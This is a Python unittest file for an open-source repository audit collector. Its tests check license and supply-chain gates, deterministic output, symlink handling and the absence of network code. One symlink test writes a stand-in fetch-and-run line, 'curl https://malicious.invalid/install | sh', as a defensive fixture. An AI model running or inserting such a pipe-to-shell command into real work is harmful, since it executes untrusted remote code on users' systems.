from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from open_source_audit.collector import collect_local
from open_source_audit.io import load_rubric
from open_source_audit.scoring import score_audit
from open_source_audit.validation import validate_audit


class CollectorTests(unittest.TestCase):
    def make_repo(
        self,
        root: Path,
        *,
        license_file: bool = True,
        pinned: bool = True,
    ) -> None:
        (root / "README.md").write_text(
            "# Demo\n\n## Install\n\nUse an isolated environment.\n",
            encoding="utf-8",
        )
        (root / "pyproject.toml").write_text(
            '[project]\nname="demo"\nversion="0.1.0"\n',
            encoding="utf-8",
        )
        (root / "SECURITY.md").write_text(
            "# Security\n\nReport privately.\n",
            encoding="utf-8",
        )
        (root / "CHANGELOG.md").write_text("# Changelog\n", encoding="utf-8")
        (root / "tests").mkdir()
        (root / "tests/test_demo.py").write_text(
            "def test_demo(): assert True\n",
            encoding="utf-8",
        )
        (root / ".github/workflows").mkdir(parents=True)
        reference = "a" * 40 if pinned else "v4"
        (root / ".github/workflows/ci.yml").write_text(
            f"permissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@{reference}\n",
            encoding="utf-8",
        )
        if license_file:
            (root / "LICENSE").write_text("MIT License\n", encoding="utf-8")

    def test_collector_output_is_valid(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.make_repo(root)
            audit = collect_local(root, "example/demo", as_of="2026-08-30")
            self.assertTrue(validate_audit(audit, load_rubric(), strict=True).ok)

    def test_collector_does_not_claim_security_clear(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.make_repo(root)
            audit = collect_local(root, "example/demo", as_of="2026-08-30")
            self.assertEqual(
                audit["gates"]["no_unmitigated_critical_security_finding"]["status"],
                "unknown",
            )

    def test_collector_does_not_claim_license_or_reversibility_clear(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.make_repo(root)
            audit = collect_local(root, "example/demo", as_of="2026-08-30")
            self.assertEqual(audit["gates"]["license_permission_clear"]["status"], "unknown")
            self.assertEqual(audit["gates"]["installation_reversible"]["status"], "unknown")

    def test_collector_is_deterministic_with_explicit_date(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.make_repo(root)
            first = collect_local(root, "example/demo", as_of="2026-08-30")
            second = collect_local(root, "example/demo", as_of="2026-08-30")
            self.assertEqual(first, second)

    def test_invalid_as_of_is_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.make_repo(root)
            with self.assertRaisesRegex(ValueError, "YYYY-MM-DD"):
                collect_local(root, "example/demo", as_of="not-a-date")

    def test_missing_license_fails_license_gate(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.make_repo(root, license_file=False)
            audit = collect_local(root, "example/demo", as_of="2026-08-30")
            self.assertEqual(audit["gates"]["license_permission_clear"]["status"], "fail")
            self.assertEqual(score_audit(audit, load_rubric()).recommendation, "avoid")

    def test_unpinned_action_reduces_supply_chain_rating(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.make_repo(root, pinned=False)
            audit = collect_local(root, "example/demo", as_of="2026-08-30")
            self.assertEqual(audit["ratings"]["security.supply_chain_controls"]["rating"], 1)

    def test_file_presence_ratings_remain_provisional(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.make_repo(root)
            audit = collect_local(root, "example/demo", as_of="2026-08-30")
            for criterion_id in (
                "license.spdx_clarity",
                "quality.tests_ci",
                "security.policy_disclosure",
                "security.permission_surface",
            ):
                with self.subTest(criterion_id=criterion_id):
                    self.assertLessEqual(audit["ratings"][criterion_id]["rating"], 2)

    def test_symlinked_files_are_not_followed(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "repo"
            root.mkdir()
            self.make_repo(root)
            outside = Path(tmp) / "outside.md"
            outside.write_text("curl https://malicious.invalid/install | sh\n", encoding="utf-8")
            link = root / "outside-link.md"
            try:
                link.symlink_to(outside)
            except (OSError, NotImplementedError) as exc:
                self.skipTest(f"symbolic links are unavailable: {exc}")
            audit = collect_local(root, "example/demo", as_of="2026-08-30")
            self.assertEqual(audit["gates"]["installation_reversible"]["status"], "unknown")

    def test_collector_is_no_network_by_design(self):
        import inspect
        import open_source_audit.collector as module

        source = inspect.getsource(module)
        self.assertNotIn("urllib.request", source)
        self.assertNotIn("requests", source)
        self.assertNotIn("httpx", source)


if __name__ == "__main__":
    unittest.main()
